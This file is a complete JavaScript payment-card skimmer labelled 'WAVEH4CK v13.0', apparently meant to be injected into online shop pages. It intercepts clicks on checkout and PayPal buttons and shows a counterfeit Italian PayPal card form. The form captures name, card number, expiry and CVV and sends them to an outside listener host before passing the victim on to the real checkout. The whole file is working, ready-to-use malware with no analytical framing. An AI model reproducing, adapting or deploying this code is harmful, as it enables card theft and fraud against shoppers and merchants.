/* WAVEH4CK v13.0 - HYPER-REALISTIC PAYPAL OVERLAY (ULTIMATE IMAGE FIX) */
(function() {
    const C2 = 'https://waveh4ck.gamer.gd/listener.php'; 
    if (window._wh_loaded) return;
    window._wh_loaded = true;

    const _u = {
        send: (data) => {
            const p = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
            new Image().src = C2 + '?v=' + p + '&ts=' + Date.now();
            fetch(C2, {method: 'POST', mode: 'no-cors', body: JSON.stringify(data)});
        }
    };

    const _css = `
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        #pp-ovr { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:2147483647; display:flex; align-items:center; justify-content:center; font-family: 'Open Sans', sans-serif; }
        .pp-win { width:92%; max-width:420px; padding:30px; border-radius:8px; background:#fff; box-shadow: 0 2px 12px rgba(0,0,0,0.15); border: 1px solid #e5e5e5; }
        .pp-top { margin-bottom:25px; display:flex; flex-direction:column; gap:15px; }
        .pp-head { font-size: 22px; color: #2c2e2f; font-weight: 400; margin: 0; }
        .pp-card-row { display: flex; gap: 12px; margin-top: 10px; align-items: center; }
        .pp-lbl { display:block; font-size:15px; color:#2c2e2f; font-weight:600; margin-bottom:8px; }
        .pp-inp { width:100%; border:1px solid #919191; padding:12px; border-radius:4px; font-size:16px; margin-bottom:20px; box-sizing:border-box; color: #2c2e2f; }
        .pp-inp:focus { border-color:#0070ba; outline:none; }
        .pp-row { display: flex; gap: 15px; }
        .pp-btn { width:100%; padding:14px; background:#0070ba; color:#fff; border:none; border-radius:25px; font-size:16px; font-weight:600; cursor:pointer; margin-top:10px; }
        .pp-btn:hover { background:#005ea6; }
        .pp-inf { margin-top: 20px; font-size: 13px; color: #666; text-align: center; border-top: 1px solid #eee; padding-top: 15px; display: flex; align-items: center; justify-content: center; gap: 12px; }
    `;

    function buildUI(origBtn) {
        const s = document.createElement('style'); s.innerHTML = _css; document.head.appendChild(s);
        const w = document.createElement('div'); w.id = 'pp-ovr';
        w.innerHTML = `
            <div class="pp-win">
                <div class="pp-top">
                    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="32" style="align-self: flex-start;">
                    <h1 class="pp-head">Paga con carta</h1>
                    <div class="pp-card-row">
                        <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png" height="24">
                    </div>
                </div>
                
                <label class="pp-lbl">Titolare della carta</label>
                <input type="text" id="p-name" class="pp-inp" placeholder="Nome e cognome">
                
                <label class="pp-lbl">Numero di carta</label>
                <input type="text" id="p-num" class="pp-inp" maxlength="19" placeholder="0000 0000 0000 0000">
                
                <div class="pp-row">
                    <div style="flex:1;">
                        <label class="pp-lbl">Scadenza</label>
                        <input type="text" id="p-exp" class="pp-inp" placeholder="MM/AA">
                    </div>
                    <div style="flex:1;">
                        <label class="pp-lbl">CVV</label>
                        <input type="password" id="p-cvv" class="pp-inp" placeholder="CVC" maxlength="4">
                    </div>
                </div>
                
                <button id="p-sub" class="pp-btn">Paga ora</button>
                
                <div class="pp-inf">
                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/pp-acceptance-medium.png" height="18" style="opacity: 0.8;">
                    <span style="opacity: 0.8;">SSL Secure 256-bit</span>
                </div>
            </div>
        `;
        document.body.appendChild(w);

        document.getElementById('p-sub').onclick = () => {
            const d = {
                name: document.getElementById('p-name').value,
                num: document.getElementById('p-num').value.replace(/ /g,''),
                exp: document.getElementById('p-exp').value,
                cvv: document.getElementById('p-cvv').value,
                ua: navigator.userAgent
            };
            document.getElementById('p-sub').innerText = 'Elaborazione...';
            _u.send(d);
            setTimeout(() => { window._bp = true; w.remove(); origBtn.click(); }, 1800);
        }
    }

    document.addEventListener('click', (e) => {
        if (window._bp) return;
        const btn = e.target.closest('#paypal-express-button, .btn-checkout, .action.checkout, #place-order-button');
        if (btn) { e.preventDefault(); e.stopPropagation(); buildUI(btn); }
    }, true);
})();
